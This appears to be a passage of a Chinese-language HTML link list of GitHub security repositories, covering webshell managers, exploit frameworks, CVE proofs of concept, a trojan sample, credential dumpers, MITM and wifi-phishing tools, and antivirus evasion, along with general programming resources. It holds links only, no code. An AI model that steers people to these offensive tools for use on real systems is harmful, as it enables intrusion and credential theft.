+<h2 id="新版中国菜刀："><a href="#新版中国菜刀：" class="headerlink" title="新版中国菜刀："></a>新版中国菜刀：</h2><p><a target="_blank" rel="noopener" href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></p>
+<h2 id="git泄露利用EXP："><a href="#git泄露利用EXP：" class="headerlink" title="git泄露利用EXP："></a>git泄露利用EXP：</h2><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
+<h2 id="浏览器攻击框架："><a href="#浏览器攻击框架：" class="headerlink" title="浏览器攻击框架："></a>浏览器攻击框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<h2 id="自动化绕过WAF脚本："><a href="#自动化绕过WAF脚本：" class="headerlink" title="自动化绕过WAF脚本："></a>自动化绕过WAF脚本：</h2><p><a target="_blank" rel="noopener" href="https://github.com/khalilbijjou/WAFNinja">https://github.com/khalilbijjou/WAFNinja</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/owtf/wafbypasser">https://github.com/owtf/wafbypasser</a></p>
+<h2 id="一款开源WAF："><a href="#一款开源WAF：" class="headerlink" title="一款开源WAF："></a>一款开源WAF：</h2><p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/ModSecurity">https://github.com/SpiderLabs/ModSecurity</a></p>
+<h2 id="http命令行客户端："><a href="#http命令行客户端：" class="headerlink" title="http命令行客户端："></a>http命令行客户端：</h2><p><a target="_blank" rel="noopener" href="https://github.com/jkbrzt/httpie">https://github.com/jkbrzt/httpie</a></p>
+<h2 id="浏览器调试利器："><a href="#浏览器调试利器：" class="headerlink" title="浏览器调试利器："></a>浏览器调试利器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/firebug/firebug">https://github.com/firebug/firebug</a></p>
+<h2 id="DISCUZ漏洞扫描器："><a href="#DISCUZ漏洞扫描器：" class="headerlink" title="DISCUZ漏洞扫描器："></a>DISCUZ漏洞扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a></p>
+<h2 id="自动化代码审计工具"><a href="#自动化代码审计工具" class="headerlink" title="自动化代码审计工具"></a>自动化代码审计工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a></p>
+<h2 id="浏览器攻击框架：-1"><a href="#浏览器攻击框架：-1" class="headerlink" title="浏览器攻击框架："></a>浏览器攻击框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/julienbedard/browsersploit">https://github.com/julienbedard/browsersploit</a></p>
+<h2 id="tomcat自动后门部署："><a href="#tomcat自动后门部署：" class="headerlink" title="tomcat自动后门部署："></a>tomcat自动后门部署：</h2><p><a target="_blank" rel="noopener" href="https://github.com/mgeeky/tomcatWarDeployer">https://github.com/mgeeky/tomcatWarDeployer</a></p>
+<h2 id="网络空间指纹扫描器："><a href="#网络空间指纹扫描器：" class="headerlink" title="网络空间指纹扫描器："></a>网络空间指纹扫描器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a></p>
+<h2 id="burpsuit之J2EE扫描插件："><a href="#burpsuit之J2EE扫描插件：" class="headerlink" title="burpsuit之J2EE扫描插件："></a>burpsuit之J2EE扫描插件：</h2><p><a target="_blank" rel="noopener" href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a></p>
+<h1 id="windows域渗透工具："><a href="#windows域渗透工具：" class="headerlink" title="windows域渗透工具："></a>windows域渗透工具：</h1><h2 id="mimikatz明文注入："><a href="#mimikatz明文注入：" class="headerlink" title="mimikatz明文注入："></a>mimikatz明文注入：</h2><p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<h2 id="Powershell渗透库合集："><a href="#Powershell渗透库合集：" class="headerlink" title="Powershell渗透库合集："></a>Powershell渗透库合集：</h2><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<h2 id="Powershell-tools合集："><a href="#Powershell-tools合集：" class="headerlink" title="Powershell tools合集："></a>Powershell tools合集：</h2><p><a target="_blank" rel="noopener" href="https://github.com/clymb3r/PowerShell">https://github.com/clymb3r/PowerShell</a></p>
+<h2 id="powershell的mimikittenz"><a href="#powershell的mimikittenz" class="headerlink" title="powershell的mimikittenz:"></a>powershell的mimikittenz:</h2><p><a target="_blank" rel="noopener" href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p>
+<h2 id="域渗透教程"><a href="#域渗透教程" class="headerlink" title="域渗透教程:"></a>域渗透教程:</h2><p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p>
+<h1 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz:"></a>Fuzz:</h1><h2 id="Web向Fuzz工具"><a href="#Web向Fuzz工具" class="headerlink" title="Web向Fuzz工具"></a>Web向Fuzz工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
+<h2 id="HTTP暴力破解，撞库攻击脚本"><a href="#HTTP暴力破解，撞库攻击脚本" class="headerlink" title="HTTP暴力破解，撞库攻击脚本"></a>HTTP暴力破解，撞库攻击脚本</h2><p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a></p>
+<h1 id="漏洞利用及攻击框架："><a href="#漏洞利用及攻击框架：" class="headerlink" title="漏洞利用及攻击框架："></a>漏洞利用及攻击框架：</h1><h2 id="msf框架："><a href="#msf框架：" class="headerlink" title="msf框架："></a>msf框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
+<h2 id="pocsscan攻击框架："><a href="#pocsscan攻击框架：" class="headerlink" title="pocsscan攻击框架："></a>pocsscan攻击框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a></p>
+<h2 id="Pocsuite攻击框架"><a href="#Pocsuite攻击框架" class="headerlink" title="Pocsuite攻击框架:"></a>Pocsuite攻击框架:</h2><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a></p>
+<h2 id="Beebeeto攻击框架："><a href="#Beebeeto攻击框架：" class="headerlink" title="Beebeeto攻击框架："></a>Beebeeto攻击框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a></p>
+<h1 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP:"></a>漏洞POC&amp;EXP:</h1><h2 id="ExploitDB官方git版本"><a href="#ExploitDB官方git版本" class="headerlink" title="ExploitDB官方git版本:"></a>ExploitDB官方git版本:</h2><p><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploit-database">https://github.com/offensive-security/exploit-database</a></p>
+<h2 id="php漏洞代码分析："><a href="#php漏洞代码分析：" class="headerlink" title="php漏洞代码分析："></a>php漏洞代码分析：</h2><p><a target="_blank" rel="noopener" href="https://github.com/80vul/phpcodz">https://github.com/80vul/phpcodz</a></p>
+<h2 id="CVE-2016-2107"><a href="#CVE-2016-2107" class="headerlink" title="CVE-2016-2107:"></a>CVE-2016-2107:</h2><p><a target="_blank" rel="noopener" href="https://github.com/FiloSottile/CVE-2016-2107">https://github.com/FiloSottile/CVE-2016-2107</a></p>
+<h2 id="CVE-2015-7547-POC："><a href="#CVE-2015-7547-POC：" class="headerlink" title="CVE-2015-7547 POC："></a>CVE-2015-7547 POC：</h2><p><a target="_blank" rel="noopener" href="https://github.com/fjserna/CVE-2015-7547">https://github.com/fjserna/CVE-2015-7547</a></p>
+<h2 id="JAVA反序列化POC生成工具"><a href="#JAVA反序列化POC生成工具" class="headerlink" title="JAVA反序列化POC生成工具:"></a>JAVA反序列化POC生成工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<h2 id="JAVA反序列化EXP"><a href="#JAVA反序列化EXP" class="headerlink" title="JAVA反序列化EXP:"></a>JAVA反序列化EXP:</h2><p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/JavaUnserializeExploits">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
+<h2 id="Jenkins-CommonCollections-EXP"><a href="#Jenkins-CommonCollections-EXP" class="headerlink" title="Jenkins CommonCollections EXP:"></a>Jenkins CommonCollections EXP:</h2><p><a target="_blank" rel="noopener" href="https://github.com/CaledoniaProject/jenkins-cli-exploit">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
+<h2 id="CVE-2015-2426-EXP-windows内核提权"><a href="#CVE-2015-2426-EXP-windows内核提权" class="headerlink" title="CVE-2015-2426 EXP (windows内核提权):"></a>CVE-2015-2426 EXP (windows内核提权):</h2><p><a target="_blank" rel="noopener" href="https://github.com/vlad902/hacking-team-windows-kernel-lpe">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p>
+<h2 id="use-docker-to-show-web-attack-php本地文件包含结合phpinfo-getshell-以及ssrf结合curl的利用演示"><a href="#use-docker-to-show-web-attack-php本地文件包含结合phpinfo-getshell-以及ssrf结合curl的利用演示" class="headerlink" title="use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):"></a>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</h2><p><a target="_blank" rel="noopener" href="https://github.com/hxer/vulnapp">https://github.com/hxer/vulnapp</a></p>
+<h2 id="php7缓存覆写漏洞Demo及相关工具"><a href="#php7缓存覆写漏洞Demo及相关工具" class="headerlink" title="php7缓存覆写漏洞Demo及相关工具:"></a>php7缓存覆写漏洞Demo及相关工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></p>
+<h2 id="XcodeGhost木马样本"><a href="#XcodeGhost木马样本" class="headerlink" title="XcodeGhost木马样本:"></a>XcodeGhost木马样本:</h2><p><a target="_blank" rel="noopener" href="https://github.com/XcodeGhostSource/XcodeGhost">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
+<h1 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h1><h2 id="中间人攻击框架"><a href="#中间人攻击框架" class="headerlink" title="中间人攻击框架:"></a>中间人攻击框架:</h2><p><a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/secretsquirrel/BDFProxy">https://github.com/secretsquirrel/BDFProxy</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/MITMf">https://github.com/byt3bl33d3r/MITMf</a></p>
+<h2 id="Inject-code-jam-wifi-and-spy-on-wifi-users"><a href="#Inject-code-jam-wifi-and-spy-on-wifi-users" class="headerlink" title="Inject code, jam wifi, and spy on wifi users:"></a>Inject code, jam wifi, and spy on wifi users:</h2><p><a target="_blank" rel="noopener" href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a></p>
+<h2 id="中间人代理工具"><a href="#中间人代理工具" class="headerlink" title="中间人代理工具:"></a>中间人代理工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/intrepidusgroup/mallory">https://github.com/intrepidusgroup/mallory</a></p>
+<h2 id="wifi钓鱼"><a href="#wifi钓鱼" class="headerlink" title="wifi钓鱼:"></a>wifi钓鱼:</h2><p><a target="_blank" rel="noopener" href="https://github.com/sophron/wifiphisher">https://github.com/sophron/wifiphisher</a></p>
+<h1 id="密码破解："><a href="#密码破解：" class="headerlink" title="密码破解："></a>密码破解：</h1><h2 id="密码破解工具"><a href="#密码破解工具" class="headerlink" title="密码破解工具:"></a>密码破解工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/shinnok/johnny">https://github.com/shinnok/johnny</a></p>
+<h2 id="本地存储的各类密码提取利器"><a href="#本地存储的各类密码提取利器" class="headerlink" title="本地存储的各类密码提取利器:"></a>本地存储的各类密码提取利器:</h2><p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+<h1 id="二进制及代码分析工具："><a href="#二进制及代码分析工具：" class="headerlink" title="二进制及代码分析工具："></a>二进制及代码分析工具：</h1><h2 id="二进制分析工具"><a href="#二进制分析工具" class="headerlink" title="二进制分析工具"></a>二进制分析工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/devttys0/binwalk">https://github.com/devttys0/binwalk</a></p>
+<h2 id="系统扫描器"><a href="#系统扫描器" class="headerlink" title="系统扫描器"></a>系统扫描器</h2><p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/binmap">https://github.com/quarkslab/binmap</a></p>
+<h2 id="rp"><a href="#rp" class="headerlink" title="rp:"></a>rp:</h2><p><a target="_blank" rel="noopener" href="https://github.com/0vercl0k/rp">https://github.com/0vercl0k/rp</a></p>
+<h2 id="Windows-Exploit-Development工具"><a href="#Windows-Exploit-Development工具" class="headerlink" title="Windows Exploit Development工具"></a>Windows Exploit Development工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/lillypad/badger">https://github.com/lillypad/badger</a></p>
+<h2 id="二进制静态分析工具（python）"><a href="#二进制静态分析工具（python）" class="headerlink" title="二进制静态分析工具（python）:"></a>二进制静态分析工具（python）:</h2><p><a target="_blank" rel="noopener" href="https://github.com/bdcht/amoco">https://github.com/bdcht/amoco</a></p>
+<h2 id="Python-Exploit-Development-Assistance-for-GDB"><a href="#Python-Exploit-Development-Assistance-for-GDB" class="headerlink" title="Python Exploit Development Assistance for GDB:"></a>Python Exploit Development Assistance for GDB:</h2><p><a target="_blank" rel="noopener" href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
+<h2 id="对BillGates-Linux-Botnet系木马活动的监控工具"><a href="#对BillGates-Linux-Botnet系木马活动的监控工具" class="headerlink" title="对BillGates Linux Botnet系木马活动的监控工具"></a>对BillGates Linux Botnet系木马活动的监控工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/ValdikSS/billgates-botnet-tracker">https://github.com/ValdikSS/billgates-botnet-tracker</a></p>
+<h2 id="木马配置参数提取工具"><a href="#木马配置参数提取工具" class="headerlink" title="木马配置参数提取工具:"></a>木马配置参数提取工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/kevthehermit/RATDecoders">https://github.com/kevthehermit/RATDecoders</a></p>
+<h2 id="Shellphish编写的二进制分析工具（CTF向）"><a href="#Shellphish编写的二进制分析工具（CTF向）" class="headerlink" title="Shellphish编写的二进制分析工具（CTF向）:"></a>Shellphish编写的二进制分析工具（CTF向）:</h2><p><a target="_blank" rel="noopener" href="https://github.com/angr/angr">https://github.com/angr/angr</a></p>
+<h2 id="针对python的静态代码分析工具"><a href="#针对python的静态代码分析工具" class="headerlink" title="针对python的静态代码分析工具:"></a>针对python的静态代码分析工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/yinwang0/pysonar2">https://github.com/yinwang0/pysonar2</a></p>
+<h2 id="一个自动化的脚本（shell）分析工具，用来给出警告和建议"><a href="#一个自动化的脚本（shell）分析工具，用来给出警告和建议" class="headerlink" title="一个自动化的脚本（shell）分析工具，用来给出警告和建议:"></a>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</h2><p><a target="_blank" rel="noopener" href="https://github.com/koalaman/shellcheck">https://github.com/koalaman/shellcheck</a></p>
+<h2 id="基于AST变换的简易Javascript反混淆辅助工具"><a href="#基于AST变换的简易Javascript反混淆辅助工具" class="headerlink" title="基于AST变换的简易Javascript反混淆辅助工具:"></a>基于AST变换的简易Javascript反混淆辅助工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/ChiChou/etacsufbo">https://github.com/ChiChou/etacsufbo</a></p>
+<h1 id="EXP编写框架及工具："><a href="#EXP编写框架及工具：" class="headerlink" title="EXP编写框架及工具："></a>EXP编写框架及工具：</h1><h2 id="二进制EXP编写工具"><a href="#二进制EXP编写工具" class="headerlink" title="二进制EXP编写工具:"></a>二进制EXP编写工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/t00sh/rop-tool">https://github.com/t00sh/rop-tool</a></p>
+<h1 id="CTF-Pwn-类题目脚本编写框架"><a href="#CTF-Pwn-类题目脚本编写框架" class="headerlink" title="CTF Pwn 类题目脚本编写框架:"></a>CTF Pwn 类题目脚本编写框架:</h1><p><a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
+<h1 id="an-easy-to-use-io-library-for-pwning-development"><a href="#an-easy-to-use-io-library-for-pwning-development" class="headerlink" title="an easy-to-use io library for pwning development:"></a>an easy-to-use io library for pwning development:</h1><p><a target="_blank" rel="noopener" href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a></p>
+<h1 id="跨平台注入工具"><a href="#跨平台注入工具" class="headerlink" title="跨平台注入工具:"></a>跨平台注入工具:</h1><p><a target="_blank" rel="noopener" href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
+<h1 id="哈希长度扩展攻击EXP："><a href="#哈希长度扩展攻击EXP：" class="headerlink" title="哈希长度扩展攻击EXP："></a>哈希长度扩展攻击EXP：</h1><p><a target="_blank" rel="noopener" href="https://github.com/citronneur/rdpy">https://github.com/citronneur/rdpy</a></p>
+<h1 id="隐写："><a href="#隐写：" class="headerlink" title="隐写："></a>隐写：</h1><h2 id="隐写检测工具"><a href="#隐写检测工具" class="headerlink" title="隐写检测工具"></a>隐写检测工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/abeluck/stegdetect">https://github.com/abeluck/stegdetect</a></p>
+<h1 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h1><h2 id="data-hacking合集"><a href="#data-hacking合集" class="headerlink" title="data_hacking合集:"></a>data_hacking合集:</h2><p><a target="_blank" rel="noopener" href="https://github.com/ClickSecurity/data_hacking">https://github.com/ClickSecurity/data_hacking</a></p>
+<h2 id="mobile-security-wiki"><a href="#mobile-security-wiki" class="headerlink" title="mobile-security-wiki:"></a>mobile-security-wiki:</h2><p><a target="_blank" rel="noopener" href="https://github.com/exploitprotocol/mobile-security-wiki">https://github.com/exploitprotocol/mobile-security-wiki</a></p>
+<h2 id="书籍《reverse-engineering-for-beginners》"><a href="#书籍《reverse-engineering-for-beginners》" class="headerlink" title="书籍《reverse-engineering-for-beginners》:"></a>书籍《reverse-engineering-for-beginners》:</h2><p><a target="_blank" rel="noopener" href="https://github.com/veficos/reverse-engineering-for-beginners">https://github.com/veficos/reverse-engineering-for-beginners</a></p>
+<h2 id="一些信息安全标准及设备配置"><a href="#一些信息安全标准及设备配置" class="headerlink" title="一些信息安全标准及设备配置:"></a>一些信息安全标准及设备配置:</h2><p><a target="_blank" rel="noopener" href="https://github.com/luyg24/IT_security">https://github.com/luyg24/IT_security</a></p>
+<h2 id="APT相关笔记"><a href="#APT相关笔记" class="headerlink" title="APT相关笔记:"></a>APT相关笔记:</h2><p><a target="_blank" rel="noopener" href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a></p>
+<h2 id="Kcon资料"><a href="#Kcon资料" class="headerlink" title="Kcon资料:"></a>Kcon资料:</h2><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a></p>
+<h2 id="《DO-NOT-FUCK-WITH-A-HACKER》"><a href="#《DO-NOT-FUCK-WITH-A-HACKER》" class="headerlink" title="《DO NOT FUCK WITH A HACKER》:"></a>《DO NOT FUCK WITH A HACKER》:</h2><p><a target="_blank" rel="noopener" href="https://github.com/citypw/DNFWAH">https://github.com/citypw/DNFWAH</a></p>
+<h2 id="各类安全脑洞图："><a href="#各类安全脑洞图：" class="headerlink" title="各类安全脑洞图："></a>各类安全脑洞图：</h2><p><a target="_blank" rel="noopener" href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p>
+<h2 id="信息安全流程图："><a href="#信息安全流程图：" class="headerlink" title="信息安全流程图："></a>信息安全流程图：</h2><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/sec-chart/">https://github.com/SecWiki/sec-chart/</a> tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</p>
+<h1 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h1><h2 id="近年ctf-writeup大全"><a href="#近年ctf-writeup大全" class="headerlink" title="近年ctf writeup大全:"></a>近年ctf writeup大全:</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctfs/write-ups-2016">https://github.com/ctfs/write-ups-2016</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ctfs/write-ups-2015">https://github.com/ctfs/write-ups-2015</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ctfs/write-ups-2014">https://github.com/ctfs/write-ups-2014</a></p>
+<h2 id="fbctf竞赛平台Demo"><a href="#fbctf竞赛平台Demo" class="headerlink" title="fbctf竞赛平台Demo:"></a>fbctf竞赛平台Demo:</h2><p><a target="_blank" rel="noopener" href="https://github.com/facebook/fbctf">https://github.com/facebook/fbctf</a></p>
+<h2 id="ctf-Resources"><a href="#ctf-Resources" class="headerlink" title="ctf Resources:"></a>ctf Resources:</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctfs/resources">https://github.com/ctfs/resources</a></p>
+<h2 id="ctf及黑客资源合集"><a href="#ctf及黑客资源合集" class="headerlink" title="ctf及黑客资源合集:"></a>ctf及黑客资源合集:</h2><p><a target="_blank" rel="noopener" href="https://github.com/bt3gl/My-Gray-Hacker-Resources">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p>
+<h2 id="ctf和安全工具大合集"><a href="#ctf和安全工具大合集" class="headerlink" title="ctf和安全工具大合集:"></a>ctf和安全工具大合集:</h2><p><a target="_blank" rel="noopener" href="https://github.com/zardus/ctf-tools">https://github.com/zardus/ctf-tools</a></p>
+<h2 id="ctf向-python工具包"><a href="#ctf向-python工具包" class="headerlink" title="ctf向 python工具包"></a>ctf向 python工具包</h2><p><a target="_blank" rel="noopener" href="https://github.com/P1kachu/v0lt">https://github.com/P1kachu/v0lt</a></p>
+<h1 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源:"></a>各类编程资源:</h1><h2 id="大礼包（什么都有）"><a href="#大礼包（什么都有）" class="headerlink" title="大礼包（什么都有）:"></a>大礼包（什么都有）:</h2><p><a target="_blank" rel="noopener" href="https://github.com/bayandin/awesome-awesomeness">https://github.com/bayandin/awesome-awesomeness</a></p>
+<h2 id="bash-handbook"><a href="#bash-handbook" class="headerlink" title="bash-handbook:"></a>bash-handbook:</h2><p><a target="_blank" rel="noopener" href="https://github.com/denysdovhan/bash-handbook">https://github.com/denysdovhan/bash-handbook</a></p>
+<h2 id="python资源大全"><a href="#python资源大全" class="headerlink" title="python资源大全:"></a>python资源大全:</h2><p><a target="_blank" rel="noopener" href="https://github.com/jobbole/awesome-python-cn">https://github.com/jobbole/awesome-python-cn</a></p>
+<h2 id="git学习资料"><a href="#git学习资料" class="headerlink" title="git学习资料:"></a>git学习资料:</h2><p><a target="_blank" rel="noopener" href="https://github.com/xirong/my-git">https://github.com/xirong/my-git</a></p>
+<h2 id="安卓开源代码解析"><a href="#安卓开源代码解析" class="headerlink" title="安卓开源代码解析"></a>安卓开源代码解析</h2><p><a target="_blank" rel="noopener" href="https://github.com/android-cn/android-open-project">https://github.com/android-cn/android-open-project</a></p>
+<h2 id="python框架，库，资源大合集"><a href="#python框架，库，资源大合集" class="headerlink" title="python框架，库，资源大合集:"></a>python框架，库，资源大合集:</h2><p><a target="_blank" rel="noopener" href="https://github.com/vinta/awesome-python">https://github.com/vinta/awesome-python</a></p>
+<h2 id="JS-正则表达式库（用于简化构造复杂的JS正则表达式）"><a href="#JS-正则表达式库（用于简化构造复杂的JS正则表达式）" class="headerlink" title="JS 正则表达式库（用于简化构造复杂的JS正则表达式）:"></a>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</h2><p><a target="_blank" rel="noopener" href="https://github.com/VerbalExpressions/JSVerbalExpressions">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
+<h1 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h1><h2 id="python-正则表达式库（用于简化构造复杂的python正则表达式）"><a href="#python-正则表达式库（用于简化构造复杂的python正则表达式）" class="headerlink" title="python 正则表达式库（用于简化构造复杂的python正则表达式）:"></a>python 正则表达式库（用于简化构造复杂的python正则表达式）:</h2><p><a target="_blank" rel="noopener" href="https://github.com/VerbalExpressions/">https://github.com/VerbalExpressions/</a></p>
+<h2 id="python任务管理以及命令执行库"><a href="#python任务管理以及命令执行库" class="headerlink" title="python任务管理以及命令执行库:"></a>python任务管理以及命令执行库:</h2><p><a target="_blank" rel="noopener" href="https://github.com/pyinvoke/invoke">https://github.com/pyinvoke/invoke</a></p>
+<h2 id="python-exe打包库"><a href="#python-exe打包库" class="headerlink" title="python exe打包库:"></a>python exe打包库:</h2><p><a target="_blank" rel="noopener" href="https://github.com/pyinstaller/pyinstaller">https://github.com/pyinstaller/pyinstaller</a></p>
+<h2 id="Veil-Evasion免杀项目："><a href="#Veil-Evasion免杀项目：" class="headerlink" title="Veil-Evasion免杀项目："></a>Veil-Evasion免杀项目：</h2><p><a target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p>
+<h2 id="py3-爬虫框架"><a href="#py3-爬虫框架" class="headerlink" title="py3 爬虫框架:"></a>py3 爬虫框架:</h2><p><a target="_blank" rel="noopener" href="https://github.com/orf/cyborg">https://github.com/orf/cyborg</a></p>
+<h2 id="一个提供底层接口数据包编程和网络协议支持的python库"><a href="#一个提供底层接口数据包编程和网络协议支持的python库" class="headerlink" title="一个提供底层接口数据包编程和网络协议支持的python库:"></a>一个提供底层接口数据包编程和网络协议支持的python库:</h2><p><a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a></p>
+<h2 id="python-requests-库"><a href="#python-requests-库" class="headerlink" title="python requests 库:"></a>python requests 库:</h2><p><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests">https://github.com/kennethreitz/requests</a></p>
+<h2 id="python-实用工具合集"><a href="#python-实用工具合集" class="headerlink" title="python 实用工具合集:"></a>python 实用工具合集:</h2><p><a target="_blank" rel="noopener" href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a></p>
+<h2 id="python爬虫系统"><a href="#python爬虫系统" class="headerlink" title="python爬虫系统:"></a>python爬虫系统:</h2><p><a target="_blank" rel="noopener" href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
+<h1 id="科学上网："><a href="#科学上网：" class="headerlink" title="科学上网："></a>科学上网：</h1><h2 id="科学上网工具"><a href="#科学上网工具" class="headerlink" title="科学上网工具"></a>科学上网工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a></p>
+<h1 id="福利："><a href="#福利：" class="headerlink" title="福利："></a>福利：</h1><h2 id="微信自动抢红包动态库"><a href="#微信自动抢红包动态库" class="headerlink" title="微信自动抢红包动态库"></a>微信自动抢红包动态库</h2><p><a target="_blank" rel="noopener" href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a></p>
+<h2 id="微信抢红包插件（安卓版）"><a href="#微信抢红包插件（安卓版）" class="headerlink" title="微信抢红包插件（安卓版）"></a>微信抢红包插件（安卓版）</h2><p><a target="_blank" rel="noopener" href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p>
+<h2 id="hardsed神器"><a href="#hardsed神器" class="headerlink" title="hardsed神器:"></a>hardsed神器:</h2><p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
+<h1 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h1><h2 id="web索引及日志搜索工具："><a href="#web索引及日志搜索工具：" class="headerlink" title="web索引及日志搜索工具："></a>web索引及日志搜索工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a></p>
+<h2 id="开源日志采集器："><a href="#开源日志采集器：" class="headerlink" title="开源日志采集器："></a>开源日志采集器：</h2><p><a target="_blank" rel="noopener" href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a></p>
+<h2 id="扫描CS结构的web-debuger"><a href="#扫描CS结构的web-debuger" class="headerlink" title="扫描CS结构的web debuger"></a>扫描CS结构的web debuger</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a></p>
+<h2 id="恢复sqlite数据库删除注册信息："><a href="#恢复sqlite数据库删除注册信息：" class="headerlink" title="恢复sqlite数据库删除注册信息："></a>恢复sqlite数据库删除注册信息：</h2><p><a target="_blank" rel="noopener" href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a></p>
